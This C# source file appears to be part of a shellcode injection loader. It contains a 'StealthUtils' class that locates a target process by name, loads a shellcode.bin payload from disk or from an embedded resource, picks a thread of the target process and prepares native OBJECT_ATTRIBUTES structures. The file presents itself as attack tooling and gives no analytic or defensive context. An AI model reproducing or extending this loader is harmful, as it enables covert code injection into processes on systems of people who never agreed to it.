using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace TaskManagerLoader
{
    public static class StealthUtils
    {
        public static int FindProcessByName(string processName)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName(processName.Replace(".exe", ""));
                if (processes.Length > 0)
                    return processes[0].Id;
            }
            catch { }
            return 0;
        }

        public static byte[] LoadShellcodeFromResource()
        {
            string shellcodePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "TaskManagerLoader.shellcode.bin");
            if (File.Exists(shellcodePath))
            {
                return File.ReadAllBytes(shellcodePath);
            }

            Assembly assembly = Assembly.GetExecutingAssembly();
            string[] resourceNames = assembly.GetManifestResourceNames();
            string resourceName = resourceNames.FirstOrDefault(name => name.Contains("shellcode.bin"));

            if (resourceName != null)
            {
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream != null)
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            stream.CopyTo(ms);
                            return ms.ToArray();
                        }
                    }
                }
            }

            return null;
        }

        public static int FindThreadByHandleDuplication(IntPtr hProcess, int targetPid)
        {
            try
            {
                Process targetProcess = Process.GetProcessById(targetPid);
                if (targetProcess.Threads.Count > 0)
                {
                    return targetProcess.Threads[0].Id;
                }
            }
            catch { }
            return 0;
        }

        public static OBJECT_ATTRIBUTES InitializeObjectAttributes()
        {
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            oa.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            oa.RootDirectory = IntPtr.Zero;
            oa.ObjectName = IntPtr.Zero;
            oa.Attributes = 0;
            oa.SecurityDescriptor = IntPtr.Zero;
            oa.SecurityQualityOfService = IntPtr.Zero;
            return oa;
        }
    }
}

